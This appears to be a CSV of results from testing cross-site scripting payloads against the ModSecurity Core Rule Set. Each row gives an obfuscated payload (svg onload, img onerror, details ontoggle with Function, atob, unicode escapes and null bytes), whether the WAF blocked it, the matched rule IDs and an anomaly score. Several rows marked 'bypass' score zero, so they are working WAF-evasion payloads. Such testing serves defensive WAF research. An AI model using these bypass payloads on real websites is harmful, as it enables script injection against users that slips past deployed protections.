index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
423,;%3E%3CsVg%2F%2F%26%23111%3B%26%23110%3B%26%23108%3B%26%23111%3B%26%2397%3B%26%23100%3B%2F%2F%2F%2F%3D%2F%2F%2F%2F%60fUNcTiOn%60%60%7BeVAl%60AtOB%60%27YWxlCnQOMsk%2F%2F%2F%2F%3D%2F%2F%2F%2F%27%60%60%7D%60%60%60%3E%22%3E%3Ca%2F%2F%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%2F%2F%2F%2F%3D%2F%2F%2F%2F%23%3EX%3C%2FA%3E%22%3E%3Ca%20hRef%3D%23%3Ex%3C%2FA%3E%3CimG%20srC%3Dx%20onERRor%3DalErt%281%29%3EaLeRT%281%29%3C%2FScRIPt%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3EaLErT%281%29%3C%2FScRipt%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3Ealert%281%29%3C%2Fscript%3E<img src=x onerror=alert(1)>alert(1)</script>,0,1,block,4,"941100,941120,941160,949110","v217,616t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o127,9v217,616t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o2,269v217,616t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177679616675.898759
424,&lt;svg/\u006f\u006e\u006c\u006f\u0061\u0064////=////(function(){window[atob(&#x27;YWxlcnQ////=////&#x27;)](1);})()&gt;&quot;&gt;&lt;a//hre%00fhre%00f//=//#&gt;x&lt;/a&gt;&lt;img src=x o/*x*/ne%00rror&#111;&#110;&#101;/*x*/rror=con%00firmcon%00firm(1)&gt;con%00firmcon%00firm(1)&lt;/scr%00iptscr%00ipt&gt;&lt;scr%00iptscr%00ipt&gt;con%00firmcon%00firm(1)&lt;/scr%00iptscr%00ipt&gt;&lt;scr%00iptscr%00ipt&gt;ale%00rtale%00rt(1)&lt;/scr%00iptscr%00ipt&gt;<img src=x onerror=alert(1)>,0,1,block,9,"920270,934100,934100,941100,941110,941120,941160,941370,949110","o139,1o144,1o189,1o225,1o233,1o248,1o256,1o272,1o279,1o294,1o301,1o312,1o320,1o336,1o343,1o358,1o365,1o376,1o382,1o396,1o403,1v217,481t:urlDecodeUni || o54,11v217,481 || o54,11v217,481t:urlDecodeUni || v217,481t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o185,14v217,481t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o283,9v217,481t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,292v217,481t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o65,42v217,481t:urlDecodeUni,t:compressWhitespace || ",40,177679617874.900879
448,"<details open ontoggle	=	'Function(unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177679646113.198872
1007,%3Csvg%2F%2Fo%2F%2Ax%2A%2Fnl%2F%2Ax%2A%2Foad%2F%2F%2F%2F%09%3D%09%2F%2F%2F%2F%28function%28%29%7Bwindow%5Batob%28%27YWxlcnQ%2F%2F%2F%2F%09%3D%09%2F%2F%2F%2F%27%29%5D%281%29%3B%7D%29%28%29%3E%3Cimg%20src%3Dx%20o%2F%2Ax%2A%2Fne%2F%2Ax%2A%2Frror%3Dal%2F%2Ax%2A%2Fert%281%29%3Eal%2F%2Ax%2A%2Fert%281%29%3C%2Fscr%2F%2Ax%2A%2Fipt%3E%3Cimg%20src%3Dx%20o%2F%2Ax%2A%2Fne%2F%2Ax%2A%2Frror%3Dal%2F%2Ax%2A%2Fert%281%29%3Eal%2F%2Ax%2A%2Fert%281%29%3C%2Fscr%2F%2Ax%2A%2Fipt%3E%27%27%22%3C%21--%3C%21--%3C%21--%3C%21--<img src=x onerror=alert(1)>,0,1,block,7,"934100,941100,941120,941160,941180,941370,949110","o34,11v217,531t:urlDecodeUni || v217,531t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o257,9v217,531t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,266v217,531t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o231,4v217,531t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls || o45,34v217,531t:urlDecodeUni,t:compressWhitespace || ",30,177680317212.160023
1077,<details ontoggle	=	(Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,11v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177680400910.737134
1229,"<details open ontoggle	=	""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177680583951.619927
1443,<details open ontoggle	=	Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177680845587.687956
1564,"<details open ontoggle	=	'(Function(""al""+""ert(1)""))()'>",0,1,bypass,2,"941100,941120","v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v217,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177680993384.122685
1656,"<details open ontoggle	=	'Function(atob(""YWxlcnQoMSk	=	""))()'></details>",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17768110605.487059
